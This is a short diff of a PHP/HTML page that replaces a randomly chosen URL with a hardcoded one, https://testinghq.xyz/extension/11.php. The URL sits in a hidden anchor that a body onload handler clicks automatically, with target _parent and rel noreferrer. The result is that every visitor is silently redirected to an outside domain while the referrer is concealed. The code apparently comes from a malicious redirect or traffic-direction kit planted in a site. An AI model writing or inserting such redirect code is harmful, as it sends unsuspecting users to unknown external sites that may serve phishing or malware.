@@ -1,9 +1,5 @@
- <?php
-$fe = array('https://testinghq.xyz/extension/11.php'); 
-$key = array_rand($fe);
-$fe1 = $fe[$key];      
-?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" >
 <head>
 <meta charset="utf-8" />
@@ -30,7 +26,7 @@ $fe1 = $fe[$key];
 +		'		<title></title>'
 +		'	</head>'
 +		'	<body onload="document.getElementById(\'link\').click();">'
-+		'		<a id="link" target="_parent" rel="noreferrer" href="<?php echo $fe1; ?>"></a>'
++		'		<a id="link" target="_parent" rel="noreferrer" href="https://testinghq.xyz/extension/11.php"></a>'
 +		'	</body>'
 +		'</html>'
 		);
